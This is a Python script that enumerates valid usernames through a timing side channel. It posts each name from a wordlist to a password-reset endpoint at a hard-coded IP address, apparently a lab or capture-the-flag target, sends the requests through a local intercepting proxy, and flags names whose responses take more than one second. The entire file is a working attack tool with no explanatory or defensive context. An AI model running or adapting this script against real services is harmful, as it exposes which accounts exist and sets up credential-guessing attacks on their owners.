import requests
import sys

def check_usernames(wordlist, threshold_s):
    URL = "http://94.237.62.166:34279/reset"
    PROXY = "http://127.0.0.1:8080"
    proxies = {
        "http": PROXY,
        "https": PROXY,
    }

    with open(wordlist, 'r') as f:
        for username in f:
            username = username.strip()
            data = {
                "username": username,
            }

            r = requests.post(URL, data=data, proxies=proxies)

            if r.elapsed.total_seconds() > threshold_s:
                print(f"Valid Username found: {username} - time: {r.elapsed.total_seconds()}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <wordlist>")
        sys.exit(1)

    WORDLIST = sys.argv[1]
    THRESHOLD_S = 1
    check_usernames(WORDLIST, THRESHOLD_S)
